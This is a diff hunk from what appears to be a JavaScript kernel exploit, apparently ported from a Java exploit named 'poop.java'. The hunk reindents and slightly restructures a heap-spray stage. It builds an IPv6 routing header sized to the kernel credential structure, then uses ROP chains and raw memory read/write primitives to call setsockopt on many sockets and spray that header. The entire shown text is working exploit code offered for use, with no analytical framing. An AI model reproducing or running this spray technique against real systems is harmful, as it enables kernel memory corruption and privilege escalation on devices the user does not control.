@@ -981,57 +981,57 @@ if (!kapi.socket_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !k
       log('')
       log('[SPRAY] Spraying routing headers...')
 
-    // Build routing header in buffer - exactly like poop.java buildRthdr()
-    var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
-    var rthdr_size = (rthdr_len + 1) << 3
+      // Build routing header in buffer - exactly like poop.java buildRthdr()
+      var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
+      var rthdr_size = (rthdr_len + 1) << 3
 
-    // Zero out buffer first
-    for (var z = 0; z < UCRED_SIZE; z += 4) {
-      mem.write4(rthdr_buf.add(new BigInt(0, z)), new BigInt(0, 0))
-    }
+      // Zero out buffer first
+      for (var z = 0; z < UCRED_SIZE; z += 4) {
+        mem.write4(rthdr_buf.add(new BigInt(0, z)), new BigInt(0, 0))
+      }
 
-    // Write header bytes individually - exactly like poop.java putByte()
-    mem.write1(rthdr_buf.add(new BigInt(0, 0)), 0)                  // buf.putByte(0x00, (byte) 0)
-    mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len)          // buf.putByte(0x01, (byte) len)
-    mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0)  // buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0)
-    mem.write1(rthdr_buf.add(new BigInt(0, 3)), (rthdr_len >> 1))   // buf.putByte(0x03, (byte) (len >> 1))
+      // Write header bytes individually - exactly like poop.java putByte()
+      mem.write1(rthdr_buf.add(new BigInt(0, 0)), 0)                  // buf.putByte(0x00, (byte) 0)
+      mem.write1(rthdr_buf.add(new BigInt(0, 1)), rthdr_len)          // buf.putByte(0x01, (byte) len)
+      mem.write1(rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0)  // buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0)
+      mem.write1(rthdr_buf.add(new BigInt(0, 3)), (rthdr_len >> 1))   // buf.putByte(0x03, (byte) (len >> 1))
 
-    // Spray routing headers on all sockets
-    var spray_count = 0
-    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
-      var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
-      var setsockopt_store_addr = mem.malloc(0x10)
-      var setsockopt_insts = build_rop_chain(
-        setsockopt_wrapper,
-        new BigInt(0, ipv6_sockets[i]),
-        new BigInt(0, IPPROTO_IPV6),
-        new BigInt(0, IPV6_RTHDR),
-        rthdr_buf,
-        new BigInt(0, rthdr_size)
-      )
-      rop.store(setsockopt_insts, setsockopt_store_addr, 1)
+      // Spray routing headers on all sockets
+      var spray_count = 0
+      for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+        var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
+        var setsockopt_store_addr = mem.malloc(0x10)
+        var setsockopt_insts = build_rop_chain(
+          setsockopt_wrapper,
+          new BigInt(0, ipv6_sockets[i]),
+          new BigInt(0, IPPROTO_IPV6),
+          new BigInt(0, IPV6_RTHDR),
+          rthdr_buf,
+          new BigInt(0, rthdr_size)
+        )
+        rop.store(setsockopt_insts, setsockopt_store_addr, 1)
 
-      try {
-        rop.execute(setsockopt_insts, setsockopt_store_addr, 0x10)
-        var ret = mem.read8(setsockopt_store_addr.add(new BigInt(0, 8)))
-        mem.free(setsockopt_store_addr)
+        try {
+          rop.execute(setsockopt_insts, setsockopt_store_addr, 0x10)
+          var ret = mem.read8(setsockopt_store_addr.add(new BigInt(0, 8)))
+          mem.free(setsockopt_store_addr)
 
-        if (ret.hi() === 0xFFFFFFFF && ret.lo() === 0xFFFFFFFF) {
-          log('[SPRAY] ERROR: setsockopt failed at socket ' + i)
+          if (ret.hi() === 0xFFFFFFFF && ret.lo() === 0xFFFFFFFF) {
+            log('[SPRAY] ERROR: setsockopt failed at socket ' + i)
+            break
+          }
+
+          spray_count++
+
+          if (i % 20 === 0) {
+            log('[SPRAY] Sprayed ' + i + '/' + IPV6_SOCK_NUM)
+          }
+        } catch (e) {
+          log('[SPRAY] ERROR: Exception at socket ' + i + ': ' + e.message)
+          mem.free(setsockopt_store_addr)
           break
         }
-
-        spray_count++
-
-        if (i % 20 === 0) {
-          log('[SPRAY] Sprayed ' + i + '/' + IPV6_SOCK_NUM)
-        }
-      } catch (e) {
-        log('[SPRAY] ERROR: Exception at socket ' + i + ': ' + e.message)
-        mem.free(setsockopt_store_addr)
-        break
       }
-    }
 
       if (spray_count === IPV6_SOCK_NUM) {
         log('[SPRAY] SUCCESS - All ' + spray_count + ' routing headers sprayed')
